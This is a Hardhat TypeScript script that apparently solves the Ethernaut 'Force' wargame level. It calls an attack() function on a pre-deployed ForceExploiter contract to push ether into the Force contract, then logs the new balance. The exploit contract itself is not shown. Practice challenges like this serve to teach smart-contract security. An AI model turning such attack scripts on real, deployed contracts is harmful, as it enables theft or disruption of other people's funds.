import { BigNumber } from "ethers"
import { ethers } from "hardhat"

import { FORCE } from "../constants"
import { ForceExploiter } from "../typechain-types"

const forceExploit = async () => {
    const accounts = await ethers.getSigners()
    const myWallet = accounts[0]

    const force = await ethers.getContractAt("Force", FORCE)

    const forceExploiter: ForceExploiter = await ethers.getContract("ForceExploiter")

    const tx = await forceExploiter.attack(force.address)
    await tx.wait(1)

    console.log("balance of force contract", await ethers.provider.getBalance(force.address))
}

forceExploit()
    .then(() => {
        console.log("force exploited successfully")
        process.exit(0)
    })
    .catch((e) => {
        console.error(e)
        process.exit(1)
    })
